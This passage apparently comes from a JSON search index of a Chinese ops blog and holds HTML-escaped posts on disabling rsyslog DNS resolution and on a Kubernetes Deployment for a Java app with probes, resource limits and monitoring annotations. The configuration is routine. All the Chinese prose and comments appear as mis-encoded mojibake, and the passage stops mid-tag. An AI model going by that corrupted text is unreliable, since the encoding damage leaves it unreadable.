rsyslogd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Syslogd options are deprecated since rsyslog v3.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# If you want to use them, switch to compatibility mode 2 by \u0026#34;-c 2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# See rsyslogd(8) for more details\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSYSLOGD_OPTIONS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;-c 5 -x -Q\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUbuntuä¸‹ï¼Œæ–¹æ³•ä¸€æ ·ï¼Œæ–‡ä»¶ä¸ä¸€æ ·\u003c/p\u003e","title":"ç¦æ‰Rsyslogçš„dnsè§£æ"},{"content":"javaä¸šåŠ¡ä¸Šk8sçš„è¯ï¼Œçœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼Œè¦æ³¨æ„çš„åœ°æ–¹ï¼š\napiVersion: apps/v1 kind: Deployment metadata: name: java-web namespace: ops labels: app: java-web spec: selector: matchLabels: app: java-web replicas: 2 strategy: type: RollingUpdate template: metadata: name: java-web annotations: # ç¬¬ä¸€ç‚¹ï¼šæ–°å¢æ³¨è§£ loki.io/scrape: \u0026#39;true\u0026#39; # æŠ“å–ç›´æ¥è¾“å‡ºçš„æ—¥å¿—åˆ°lokié‡Œ prometheus.io/path: /metrics #é‡‡é›†çš„ç›‘æ§åœ°å€ prometheus.io/port: \u0026#39;2112\u0026#39; #é‡‡é›†æš´éœ²çš„ç›‘æ§ç«¯å£ prometheus.io/scrape: \u0026#39;true\u0026#39; #æ‰“å¼€é‡‡é›†å¼€å…³ labels: app: java-web spec: imagePullSecrets: # ç¬¬äºŒç‚¹ï¼šæ·»åŠ æƒé™ - name: my-docker #åªæœ‰è¯¥ç”¨æˆ·æ‰æœ‰pullé•œåƒçš„æƒé™ containers: - name: java-web image: hb.ops.top/ops/java-web:5917f92c imagePullPolicy: IfNotPresent readinessProbe: # ç¬¬ä¸‰ç‚¹ï¼šæ–°å¢å­˜æ´»æ£€æµ‹ï¼Œå½“å‰æ˜¯é’ˆå¯¹ç›‘æ§ç«¯å£è¿›è¡Œå­˜æ´»æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰å½“ç›‘æ§ç«¯å£èµ·æ¥äº†ï¼Œç¨‹åºæ‰ç®—å®Œå…¨å¯åŠ¨ httpGet: port: 2112 path: /metrics/prometheus initialDelaySeconds: 60 successThreshold: 1 failureThreshold: 3 timeoutSeconds: 5 startupProbe: httpGet: port: 2112 path: /metrics/prometheus initialDelaySeconds: 60 successThreshold: 1 failureThreshold: 3 timeoutSeconds: 5 livenessProbe: httpGet: port: 2112 path: /metrics/prometheus initialDelaySeconds: 60 successThreshold: 1 failureThreshold: 3 timeoutSeconds: 5 resources: # ç¬¬å››ç‚¹ï¼šè®¾ç½®èµ„æºé™åˆ¶ï¼Œå¦‚æœæ˜¯javaç¨‹åºï¼Œå»ºè®®limitæ¯”requestå¤§ï¼Œè¿™æ ·å¯ä»¥åˆç†åˆ†é…å †å†…å­˜å’Œéå †å†…å­˜ requests: memory: 1024Mi limits: memory: 2048Mi ports: - name: web-port containerPort: 8889 env: # ç¬¬äº”ç‚¹ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®¾ç½®æ—¶åŒºï¼ŒæŒ‡å®šEVNç¯å¢ƒï¼Œæ·»åŠ JAVAå‚æ•°ç­‰ - name: JVM_OPTS value: -javaagent:/opt/skywalking/skywalking-agent.jar -Xmx1G -Xms1G - name: TZ value: Asia/Shanghai - name: APOLLO_LABEL value: gray - name: SW_AGENT_NAME value: \u0026#39;k8s-java-web\u0026#39; - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES value: \u0026#39;10.0.0.123:11800\u0026#39; - name: ENV value: prod --- apiVersion: v1 kind: Service metadata: labels: app: java-web name: java-web namespace: ops spec: ports: - name: java-web-port port: 8889 protocol: TCP targetPort: 8889 nodePort: 30009 selector: app: java-web sessionAffinity: None type: NodePort status: loadBalancer: {} ä¸Šé¢å¿½ç•¥äº†å¯åŠ¨å‘½ä»¤ï¼Œå…¶å®å®¹å™¨å†…çš„å¯åŠ¨å‘½ä»¤ä¹Ÿæ˜¯å¾ˆæœ‰å­¦é—®çš„ã€‚\n","permalink":"https://rendoumi.com/posts/20240119-k8s_java/","summary":"\u003cp\u003ejavaä¸šåŠ¡ä¸Šk8sçš„è¯ï¼Œçœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼Œè¦æ³¨æ„çš„åœ°æ–¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eapps/v1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eDeployment\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enamespace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eops\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ematchLabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ereplicas\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estrategy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eRollingUpdate\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eannotations\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e# ç¬¬ä¸€ç‚¹ï¼šæ–°å¢æ³¨è§£\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eloki.io/scrape\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;true\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e# æŠ“å–ç›´æ¥è¾“å‡ºçš„æ—¥å¿—åˆ°lokié‡Œ\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eprometheus.io/path\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#é‡‡é›†çš„ç›‘æ§åœ°å€\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eprometheus.io/port\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2112\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#é‡‡é›†æš´éœ²çš„ç›‘æ§ç«¯å£\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eprometheus.io/scrape\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;true\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#æ‰“å¼€é‡‡é›†å¼€å…³\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullSecrets\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e# ç¬¬äºŒç‚¹ï¼šæ·»åŠ æƒé™\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emy-docker\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#åªæœ‰è¯¥ç”¨æˆ·æ‰æœ‰pullé•œåƒçš„æƒé™\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ehb.ops.top/ops/java-web:5917f92c\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eIfNotPresent\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003ereadinessProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e# ç¬¬ä¸‰ç‚¹ï¼šæ–°å¢å­˜æ´»æ£€æµ‹ï¼Œå½“å‰æ˜¯é’ˆå¯¹ç›‘æ§ç«¯å£è¿›è¡Œå­˜æ´»æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰å½“ç›‘æ§ç«¯å£èµ·æ¥äº†ï¼Œç¨‹åºæ‰ç®—å®Œå…¨å¯åŠ¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2112\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics/prometheus\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003estartupProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2112\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics/prometheus\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003elivenessProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2112\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics/prometheus\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\u003cspan 